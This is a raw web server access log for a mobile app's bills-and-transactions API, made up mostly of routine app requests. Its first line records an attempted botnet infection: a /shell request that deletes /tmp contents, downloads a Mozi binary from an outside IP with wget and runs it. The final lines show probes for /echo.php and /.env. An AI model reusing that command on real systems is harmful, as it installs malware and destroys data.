::1 - - [29/Jun/2022:00:05:53 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://112.95.92.74:33693/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.0" 404 144 "-" "Hello, world"
::ffff:127.0.0.1 - - [29/Jun/2022:12:43:02 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:43:04 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:43:04 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:43:04 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:43:05 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:43:05 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:43:28 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:43:49 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 200 980 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:43:50 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:43:54 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:43:56 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:44:01 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:44:02 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:44:28 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:44:32 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:45:07 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:45:17 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:45:22 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:45:54 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:45:55 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:46:29 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:47:44 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:47:49 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:47:51 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:47:51 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:48:26 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:48:34 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:48:44 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:48:49 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:49:03 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:49:08 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:49:11 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:49:15 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:49:16 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:49:16 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:49:30 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:49:51 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:49:58 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:50:08 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:50:27 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:50:34 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:50:41 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:50:44 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:50:51 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:50:57 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:51:03 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:51:10 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:51:20 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:51:23 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:51:43 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:51:49 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:51:52 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:52:07 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:52:28 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:52:34 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:52:45 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:52:53 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:52:59 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:53:08 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:53:11 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:53:32 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 200 1144 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:53:35 +0000] "GET /api/v1/transactions/user?bill=62bc35b780269b9067b3fb27 HTTP/1.0" 200 983 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:53:35 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:53:37 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:53:38 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:53:38 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 200 980 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:53:39 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:53:40 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:53:40 +0000] "GET /api/v1/transactions/user?bill=62bc35b780269b9067b3fb27 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:53:43 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:53:45 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:53:45 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:53:48 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:53:49 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:53:49 +0000] "GET /api/v1/transactions/user?bill=62bc35b780269b9067b3fb27 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:53:52 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:53:53 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:53:53 +0000] "GET /api/v1/transactions/user?bill=62bc41da3ce11091a7c4bac1 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:53:56 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:53:57 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:53:57 +0000] "GET /api/v1/transactions/user?bill=62bc35b780269b9067b3fb27 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:53:58 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:54:45 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:55:00 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:55:00 +0000] "GET /api/v1/transactions/user?bill=62bc41eb3ce11091a7c4baf1 HTTP/1.0" 200 983 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:55:10 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:55:19 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:55:19 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:55:19 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:55:49 +0000] "POST /api/v1/transactions HTTP/1.0" 200 256 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:55:49 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 438 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:55:49 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 438 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:55:54 +0000] "POST /api/v1/bills/drain HTTP/1.0" 400 140 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:56:53 +0000] "POST /api/v1/bills/drain HTTP/1.0" 400 140 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:56:59 +0000] "POST /api/v1/bills/drain HTTP/1.0" 400 140 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:57:09 +0000] "DELETE /api/v1/transactions/62bc4bd585a9c396eaf05ecb HTTP/1.0" 200 256 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:57:10 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:57:10 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 107 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:57:11 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:57:11 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:57:12 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 200 1855 "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:58:18 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:58:19 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:58:21 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:58:21 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:58:23 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:58:23 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:58:23 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:58:59 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:58:59 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:58:59 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:59:04 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:59:05 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:12:59:07 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Jun/2022:12:59:08 +0000] "GET /api/v1/users/logout HTTP/1.0" 304 - "-" "Expo/2.24.3.1014878 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Jun/2022:13:14:03 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::1 - - [29/Jun/2022:13:18:20 +0000] "GET /echo.php HTTP/1.0" 404 147 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
::ffff:127.0.0.1 - - [29/Jun/2022:13:25:33 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
